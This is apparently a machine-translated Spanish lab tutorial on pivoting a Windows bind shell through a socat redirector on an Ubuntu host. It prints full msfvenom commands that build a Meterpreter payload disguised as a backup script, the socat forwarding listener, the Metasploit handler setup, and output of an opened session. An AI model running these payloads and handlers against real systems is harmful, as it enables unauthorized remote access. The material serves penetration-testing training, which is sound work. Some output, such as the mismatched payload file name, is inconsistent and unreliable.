# Socat Redirection with a Bind Shell

Similar al redirector de caparazón inverso de nuestro Socat, también podemos crear un redirector Socat Bind Shell. Esto es diferente de los shells inverso que se conectan desde el servidor de Windows al servidor Ubuntu y se redirigen a nuestro host de ataque. En el caso de los shells de enlace, el servidor de Windows iniciará un oyente y se unirá a un puerto en particular. Podemos crear una carga útil de Shell Bind para Windows y ejecutarla en el host de Windows. Al mismo tiempo, podemos crear un redirector SOCAT en el servidor Ubuntu, que escuchará las conexiones entrantes desde un controlador de enlace de Metasploit y reenvía eso a una carga útil de Shell en un objetivo de Windows. La siguiente figura debe explicar el pivote de una manera mucho mejor.

![](https://academy.hackthebox.com/storage/modules/158/55.png)

Podemos crear un shell de enlace usando MSFVENOM con el comando a continuación.

### **Creando la carga útil de Windows**

Redirección de Socat con un caparazón

```
xnoxos@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe

```

Podemos comenzar un`socat bind shell`oyente, que escucha en el puerto`8080`y reenvía paquetes al servidor de Windows`8443`.

### **Comenzando el oyente de shell de socat**

Redirección de Socat con un caparazón

```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finalmente, podemos iniciar un controlador de enlace MetaSploit. Este controlador de enlace se puede configurar para conectarse a nuestro oyente de Socat en el puerto 8080 (servidor Ubuntu)

### **Configurar y iniciar el múltiple en BIND**

Redirección de Socat con un caparazón

```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080

```

Podemos ver un controlador de enlace conectado a una solicitud de etapa girada a través de un oyente Socat al ejecutar la carga útil en un objetivo de Windows.

### **Establecer la sesión de meterpreter**

Redirección de Socat con un caparazón

```
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```